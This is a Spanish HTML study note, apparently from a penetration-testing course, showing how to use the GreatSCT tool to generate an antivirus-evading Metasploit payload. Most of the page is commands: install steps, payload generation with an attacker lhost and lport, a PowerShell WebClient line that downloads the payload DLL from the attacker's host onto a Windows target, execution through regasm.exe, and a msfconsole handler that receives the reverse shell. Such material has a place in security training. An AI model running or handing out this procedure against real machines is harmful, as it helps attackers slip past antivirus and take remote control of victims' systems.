<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Evasión con GreatSCT</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Evasión con GreatSCT</h1><br/><p><h1>GREATSCT</h1></p><p></p><p><a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a></p><p></p><p>Herramienta que genera payloads que son compatibles con metasploit para hacer bypass a soluciones comunes de AV</p><p></p><p><div class="codebox"><pre><br />git clone https<span style="color:#000000;font-weight:700">://</span>github.com<span style="color:#000000;font-weight:700">/</span>GreatSCT<span style="color:#000000;font-weight:700">/</span>GreatSCT.git<br /><span style="color:#000000;font-weight:700">cd</span> GreatSCT<span style="color:#000000;font-weight:700">/</span><br /><span style="color:#000000;font-weight:700">cd</span> setup<br /><span style="color:#000000;font-weight:700">sudo</span> .<span style="color:#000000;font-weight:700">/</span>setup.sh -c<br /></pre></div></p><p></p><p>Si la ejecutamos</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sudo</span> ..<span style="color:#000000;font-weight:700">/</span>GreatSCT.py</pre></div></p><p></p><p>No tiene módulos cargados</p><p></p><p><img src="images/63-1.png" alt="images/63-1.png" /></p><p></p><p>Generamos archivo de configuración.</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">cd</span> ..<br /><span style="color:#000000;font-weight:700">cd</span> config<span style="color:#000000;font-weight:700">/</span><br /><span style="color:#000000;font-weight:700">sudo</span> python3 update.py <br /></pre></div></p><p></p><p>Ejecutamos</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">sudo</span> .<span style="color:#000000;font-weight:700">/</span>GreatSCT.py</pre></div></p><p></p><p><img src="images/63-2.png" alt="images/63-2.png" /></p><p></p><p><div class="codebox"><pre><br />list</pre></div></p><p></p><p><img src="images/63-3.png" alt="images/63-3.png" /></p><p></p><p><div class="codebox"><pre><br />use 1</pre></div></p><p></p><p><img src="images/63-4.png" alt="images/63-4.png" /></p><p></p><p><div class="codebox"><pre><br />list </pre></div></p><p></p><p><img src="images/63-5.png" alt="images/63-5.png" /></p><p></p><p>Todos los payloads tienen que ver con diferentes herramientas propias de windows  que va a utilizar para ejecutarlo.</p><p>Algunos son detectables y otros no.</p><p></p><p>En este caso vamos a probar el 16.</p><p></p><p><div class="codebox"><pre><br />use 16</pre></div></p><p></p><p><img src="images/63-6.png" alt="images/63-6.png" /></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">set</span> lhost 192.168.20.129<br /><span style="color:#000000;font-weight:700">set</span> lport 5555<br />generate<br /></pre></div></p><p></p><p>Le indicamos el nombre al gusto</p><p></p><p><img src="images/63-7.png" alt="images/63-7.png" /></p><p></p><p>Las instrucciones son las siguientes:<ul><li>Movermos el DLL a la máquina windows:</p><p></li></ul><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">cp</span> <span style="color:#000000;font-weight:700">/</span>usr<span style="color:#000000;font-weight:700">/</span>share<span style="color:#000000;font-weight:700">/</span>greatsct-output<span style="color:#000000;font-weight:700">/</span>compiled<span style="color:#000000;font-weight:700">/</span>ScottShell.dll Desktop<br /><span style="color:#000000;font-weight:700">(</span>New-Object System.NET.WebClient<span style="color:#000000;font-weight:700">)</span>.DownloadFile<span style="color:#000000;font-weight:700">(</span><span style="color:#edd400;font-weight:400">&quot;http://192.168.20.129:8000/ScottShell.dll&quot;</span>, <span style="color:#edd400;font-weight:400">&quot;ScottShell.dll&quot;</span><span style="color:#000000;font-weight:700">)</span><br /></pre></div></p><p><ul><li>Abrimos el RC file con metasploit para manejar la conexión:</p><p></li></ul><div class="codebox"><pre><br />msfconsole -r <span style="color:#000000;font-weight:700">/</span>usr<span style="color:#000000;font-weight:700">/</span>share<span style="color:#000000;font-weight:700">/</span>greatsct-output<span style="color:#000000;font-weight:700">/</span>handlers<span style="color:#000000;font-weight:700">/</span>ScottShell.rc<br /></pre></div></p><p></p><p><img src="images/63-8.png" alt="images/63-8.png" /></p><p><ul><li>Ejecutamos el dll en la máquina objetivo:</p><p></li></ul><div class="codebox"><pre><br />C<span style="color:#000000;font-weight:700">:</span><span style="color:#ce5c00;font-weight:400">\W</span>indows<span style="color:#ce5c00;font-weight:400">\M</span>icrosoft.NET<span style="color:#ce5c00;font-weight:400">\F</span>ramework<span style="color:#ce5c00;font-weight:400">\v</span>4.0.30319<span style="color:#ce5c00;font-weight:400">\r</span>egasm.exe ScottShell.dll</pre></div></p><p></p><p><img src="images/63-9.png" alt="images/63-9.png" /></p><p><ul><li>En metasploit:</li></ul></p><p></p><p><img src="images/63-10.png" alt="images/63-10.png" /></p><p></p><p></p></div>
</body>
</html>
